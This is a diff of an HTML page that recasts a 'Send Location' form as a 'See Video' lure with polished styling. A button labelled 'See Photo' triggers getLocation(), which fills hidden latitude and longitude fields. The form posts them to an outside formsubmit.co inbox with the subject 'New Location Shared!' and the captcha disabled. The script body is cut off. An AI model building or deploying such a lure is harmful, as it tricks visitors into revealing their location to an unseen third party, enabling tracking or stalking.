@@ -1,19 +1,86 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Send Location</title>
+  <meta charset="UTF-8">
+  <title>See Video</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    /* Background image with blur effect */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-image: url('img1.jpg'); /* Your local image */
+      background-size: cover;
+      background-position: center;
+      filter: blur(6px);
+      z-index: -1;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: rgba(0, 0, 0, 0.4); /* dark overlay */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px 20px;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+    }
+
+    h2 {
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    button {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    #output {
+      margin-top: 20px;
+      color: #333;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-  <h2>Click the button to see Video and Photo:</h2>
-  <form id="locationForm" method="POST" action="https://formsubmit.co/5ccabaf9d3e99562488394bd3fba321c">
-    <input type="hidden" name="latitude" id="latitude">
-    <input type="hidden" name="longitude" id="longitude">
-    <input type="hidden" name="_subject" value="New Location Shared!">
-    <input type="hidden" name="_captcha" value="false">
-    <button type="button" onclick="getLocation()">See Phot</button>
-  </form>
-
-  <p id="output"></p>
+  <div class="container">
+    <h2>Click the Button to See Video</h2>
+    <form id="locationForm" method="POST" action="https://formsubmit.co/5ccabaf9d3e99562488394bd3fba321c">
+      <input type="hidden" name="latitude" id="latitude">
+      <input type="hidden" name="longitude" id="longitude">
+      <input type="hidden" name="_subject" value="New Location Shared!">
+      <input type="hidden" name="_captcha" value="false">
+      <button type="button" onclick="getLocation()">See Photo</button>
+    </form>
+    <p id="output"></p>
+  </div>
 
   <script>
     function getLocation() {
